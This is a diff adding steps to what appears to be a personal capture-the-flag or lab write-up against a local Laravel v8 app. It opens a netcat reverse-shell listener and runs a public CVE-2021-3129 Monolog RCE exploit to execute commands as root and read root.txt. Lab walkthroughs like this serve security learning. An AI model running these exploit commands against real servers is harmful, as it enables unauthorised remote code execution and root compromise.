@@ -240,3 +240,17 @@ Then, visit <http://127.0.0.1:6001/> on attacker browser.
 Look, it's Laravel!
 
 Apparently, it's Laravel v8 (PHP v7.4.18)
+
+Also, cheating more, I'm just going to use https://github.com/HenryFBP/CVE-2021-3129_exploit.
+
+On attacker (listen for root reverse shell):
+
+    nc -lvp 6969
+
+On attacker (cause RCE, get root hopefully):
+
+    pushd ~/Git/CVE-2021-3129_exploit
+    python ./exploit.py http://localhost:6001 Monolog/RCE1 "whoami"
+    python ./exploit.py http://localhost:6001 Monolog/RCE1 "pwd; ls; cd /root/; ls; cat root.txt;"
+    
+Yay! We're done!
